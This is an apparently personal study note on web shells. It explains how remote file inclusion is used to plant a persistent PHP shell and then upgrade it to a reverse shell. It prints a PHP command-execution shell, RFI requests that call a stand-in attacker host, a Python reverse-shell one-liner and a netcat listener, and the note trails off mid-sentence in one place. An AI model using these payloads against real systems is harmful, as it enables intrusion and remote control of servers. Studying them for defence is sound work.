# 14.webshell

24/05/25

## Recall

- What is a WebShell?
- What is the difference between a WebShell and a typical RCE?
- Why would an attacker prefer to create a WebShell instead of executing one-off commands?
- What conditions must exist for a WebShell to be created?
- How can a WebShell lead to a reverse shell?
- What risks does a WebShell pose beyond simple command execution?
- How can developers detect and prevent WebShell deployment?

## Notes

### What it is

A **WebShell** is a malicious script uploaded to a web server that allows an attacker to execute arbitrary system commands through HTTP requests, effectively behaving like a shell.

The attacker typically identifies a language that the server can interpret (such as PHP, ASP, JSP, or others) and creates a script capable of receiving commands as parameters and executing them.

A WebShell acts as a bridge for persistent remote code execution (RCE). While it grants full access based on the privileges of the web process, it leaves an artifact on the server — the shell itself.

### How to identify it

A WebShell is not a vulnerability in itself but a consequence of one — usually an **RCE vulnerability**. This RCE can be achieved through several attack vectors, including:

- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- SQL Injection leading to file write (`SELECT INTO OUTFILE`)
- Unrestricted file upload
- Command injection

Once RCE is established, an attacker can deploy a WebShell by identifying the scripting language handled by the server.

Example with RFI payload:

```php
<?php system($_GET["cmd"]); ?>
```

Serving the payload:

```bash
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Loading the payload remotely:

```bash
https://target.com/?page=http://attacker:8000/payload.php?cmd=id
```

At this point, the attacker has a WebShell, but it is not persistent — it only works as long as the malicious file is being served externally.

The attacker can run a command via the temporary WebShell to write a permanent shell file on the server:

```bash
https://target.com/?page=http://attacker-ip:attacker-port/payload.php?cmd=echo '<?php system($_GET["cmd"]);' > ./shell.php
```

Testing the new WebShell:

```bash
https://target.com/shell.php?cmd=id
```

Example output:

```bash
uid=33(xxx) gid=33(xxx) groups=33(xxx)
```

Each language have a 

### How to exploit it

Once a WebShell is deployed, the attacker can execute any command the underlying web process user has permission for (commonly `www-data`, `apache`, or similar).

If the server is poorly configured, it's possible to gain full administrative access purely from the WebShell.

One of the first steps in post-exploitation is to upgrade from a WebShell to a more stable access, such as a **reverse shell**, which creates a direct, interactive terminal connection back to the attacker.

This approach often bypasses firewall restrictions because outbound traffic is generally allowed, while inbound connections (as used in bind shells) are typically blocked.

Python reverse shell example:

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("attacker-ip", attacker-port));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/bash","-i"]);'
```

Attacker listening with Netcat:

```bash
nc -lvnp attacker-port
```

Example output upon connection:

```bash
Listening on 0.0.0.0 attacker-port
Connection received on attacker-ip 53312
bash: cannot set terminal process group (80096): Inappropriate ioctl for device
bash: no job control in this shell
target-user@hostname:/var/www/html$
```

## Summary

A **WebShell** is a method for achieving persistent remote code execution by placing an executable script on the target server. It allows an attacker to execute any command the web service user has permissions for.

From a WebShell, the attacker can escalate their attack by deploying a reverse shell, which often bypasses firewall restrictions and provides an interactive terminal. This transition greatly increases the attacker's ability to perform privilege escalation, lateral movement, data exfiltration, and establish persistence within the target system.